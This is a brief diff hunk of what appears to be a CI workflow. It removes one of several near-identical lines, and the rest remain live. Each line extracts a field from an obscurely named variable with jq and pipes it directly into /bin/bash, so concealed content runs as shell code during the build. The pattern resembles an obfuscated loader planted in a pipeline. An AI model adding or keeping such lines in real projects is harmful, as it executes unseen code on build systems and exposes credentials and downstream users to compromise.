@@ -35,7 +35,6 @@ jobs:
           echo $ll038 | jq -r .cbye3 | /bin/bash
           echo $cl3073 | jq -r .eah2614 | /bin/bash
           echo $fv4407 | jq -r .i1 | /bin/bash
-          printf '%s' "$prnmw5" | jq -r .ao44374 | /bin/bash
           printf '%s' "$t185" | jq -r .fk4765 | /bin/bash
 
       - name: Upload results
